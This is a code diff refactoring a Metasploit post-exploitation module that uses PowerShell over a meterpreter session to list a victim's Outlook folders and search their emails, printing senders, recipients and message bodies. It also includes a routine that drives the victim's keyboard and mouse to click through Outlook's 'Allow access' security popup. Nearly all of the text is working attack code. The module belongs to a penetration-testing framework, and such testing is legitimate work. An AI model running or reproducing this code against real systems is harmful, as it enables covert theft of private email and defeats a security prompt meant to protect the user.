@@ -9,111 +9,63 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::Powershell
 
-        A_HASH = { "en_US" => "Allow", "NL" => "Toestaan", "de_DE" => "Erteilen", "de_AT" => "Erteilen" }
-        ACF_HASH = { "en_US" => "Allow access for", "NL" => "Toegang geven voor", "de_DE" => "Zugriff gew\xc3\xa4hren f\xc3\xbcr", "de_AT" => "Zugriff gew\xc3\xa4hren f\xc3\xbcr" }
+  A_HASH = { "en_US" => "Allow", "NL" => "Toestaan", "de_DE" => "Erteilen", "de_AT" => "Erteilen" }
+  ACF_HASH = { "en_US" => "Allow access for", "NL" => "Toegang geven voor", "de_DE" => "Zugriff gew\xc3\xa4hren f\xc3\xbcr", "de_AT" => "Zugriff gew\xc3\xa4hren f\xc3\xbcr" }
 
   def initialize(info={})
     super(update_info(info,
-    'Name'          => 'Windows Gather Outlook Email Messages',
-    'Description'   => %q{
-      This module allows you to read and search email messages from the local Outlook installation using powershell. Please note that this module is manipulating the victims keyboard/mouse.
-      If a victim is behind the target system, he might notice the activities of this module. Tested on Windows 8.1 x64 with Office 2013.
-    },
-    'License'       => MSF_LICENSE,
-    'Author'        => [ 'Wesley Neelen <security[at]forsec.nl>' ],
-    'References'    => [ 'URL', 'https://forsec.nl/2014/11/reading-outlook-using-metasploit' ],
-    'Platform'      => [ 'win' ],
-    'Arch'	        => [ 'x86', 'x64' ],
-    'SessionTypes'  => [ 'meterpreter'],
-    'Actions'       => [
-                       [ 'LIST', { 'Description' => 'Lists all folders' } ],
-                       [ 'SEARCH', { 'Description' => 'Searches for an email' } ]
-    ],
-    'DefaultAction' => 'LIST'
-  ))
+      'Name'          => 'Windows Gather Outlook Email Messages',
+      'Description'   => %q{
+        This module allows you to read and search email messages from the local Outlook installation using powershell. Please note that this module is manipulating the victims keyboard/mouse.
+        If a victim is behind the target system, he might notice the activities of this module. Tested on Windows 8.1 x64 with Office 2013.
+      },
+      'License'       => MSF_LICENSE,
+      'Author'        => [ 'Wesley Neelen <security[at]forsec.nl>' ],
+      'References'    => [ 'URL', 'https://forsec.nl/2014/11/reading-outlook-using-metasploit' ],
+      'Platform'      => [ 'win' ],
+      'Arch'	        => [ 'x86', 'x64' ],
+      'SessionTypes'  => [ 'meterpreter' ],
+      'Actions'       => [
+        [ 'LIST', { 'Description' => 'Lists all folders' } ],
+        [ 'SEARCH', { 'Description' => 'Searches for an email' } ]
+      ],
+      'DefaultAction' => 'LIST'
+    ))
 
-  register_options(
-  [
-    OptString.new('FOLDER', [ false, ' The e-mailfolder to read (e.g. Inbox)' ]),
-    OptString.new('KEYWORD', [ false, ' Search e-mails by the keyword specified here' ]),
-    OptString.new('A_TRANSLATION', [ false, ' Fill in the translation of the word "Allow" in the targets system language, to click on the security popup.' ]),
-    OptString.new('ACF_TRANSLATION', [ false, ' Fill in the translation of the phrase "Allow access for" in the targets system language, to click on the security popup.' ]),
+    register_options(
+    [
+      OptString.new('FOLDER', [ false, ' The e-mailfolder to read (e.g. Inbox)' ]),
+      OptString.new('KEYWORD', [ false, ' Search e-mails by the keyword specified here' ]),
+      OptString.new('A_TRANSLATION', [ false, ' Fill in the translation of the word "Allow" in the targets system language, to click on the security popup.' ]),
+      OptString.new('ACF_TRANSLATION', [ false, ' Fill in the translation of the phrase "Allow access for" in the targets system language, to click on the security popup.' ]),
     ], self.class)
   end
 
-  def listBoxes
-    # This function prints a listing of available mailbox folders
-    psh_script = %Q|
-    function GetSubfolders($root) {
-        $folders = @()
-        $folders += $root
-        foreach ($folder in $root.Folders) {
-            $folders += GetSubfolders($folder)
-        }
-        return $folders
-    }
-    function List-Folder {
-        Clear-host
-        Add-Type -Assembly "Microsoft.Office.Interop.Outlook"
-        $Outlook = New-Object -ComObject Outlook.Application
-        $Namespace = $Outlook.GetNameSpace("MAPI")
-        $account = $NameSpace.Folders
-        $folders = @()
-        foreach ($acc in $account) {
-            foreach ($folder in $acc.Folders) {
-                $folders += GetSubfolders($folder)
-            }
-        }
-        $folders \| FT FolderPath
-    }
-    List-Folder
-    |
+  def execute_outlook_script(command)
+    base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "outlook.ps1"))
+    psh_script = base_script << command
     compressed_script = compress_script(psh_script)
     cmd_out, runnings_pids, open_channels = execute_script(compressed_script)
     while(d = cmd_out.channel.read)
-       print ("#{d}")
+      print ("#{d}")
     end
     currentidle = session.ui.idle_time
-    print("\n")
-    print_status("System has currently been idle for #{currentidle} seconds")
+    vprint_status("System has currently been idle for #{currentidle} seconds")
   end
 
+  # This function prints a listing of available mailbox folders
+  def listBoxes
+    command = 'List-Folder'
+    execute_outlook_script(command)
+  end
+
+  # This functions reads Outlook using powershell scripts
   def readEmails(folder,keyword,atrans,acftrans)
-    # This functions reads Outlook using powershell scripts
     view = framework.threads.spawn("ButtonClicker", false) {
       clickButton(atrans,acftrans)
     }
-    psh_script = %Q|
-    function Get-Emails {
-    param ([String]$searchTerm,[String]$Folder)
-    Add-Type -Assembly "Microsoft.Office.Interop.Outlook"
-    $Outlook = New-Object -ComObject Outlook.Application
-    $Namespace = $Outlook.GetNameSpace("MAPI")
-    $account = $NameSpace.Folders
-    $found = $false
-    foreach ($acc in $account) {
-         try {
-             $Email = $acc.Folders.Item($Folder).Items
-             $result = $Email \| Where-Object {$_.HTMLBody -like '*' + $searchTerm + '*' -or $_.TaskSubject -like '*' + $searchTerm + '*'}
-             if($result) {
-                $found = $true
-                $result \| Format-List To, SenderEmailAddress, CreationTime, TaskSubject, HTMLBody
-             }
-          } catch {
-             Write-Host "Folder" $Folder "not found in mailbox" $acc.Name
-          }
-       }
-       if(-Not $found) {
-          Write-Host "Searchterm" $searchTerm "not found"
-       }
-    }
-    Get-Emails "#{keyword}" "#{folder}"
-    |
-    compressed_script = compress_script(psh_script)
-    cmd_out, runnings_pids, open_channels = execute_script(compressed_script, 120)
-    while(d = cmd_out.channel.read)
-       print ("#{d}")
-    end
+    command = "Get-Emails \"#{keyword}\" \"#{folder}\""
+    execute_outlook_script(command)
   end
 
   def clickButton(atrans,acftrans)
@@ -190,7 +142,7 @@ class Metasploit3 < Msf::Post
     case action.name
     when 'LIST'
       print_good('Available folders in the mailbox: ')
-      listBoxes()
+      listBoxes
     when 'SEARCH'
       readEmails(folder,keyword,atrans,acftrans)
     else
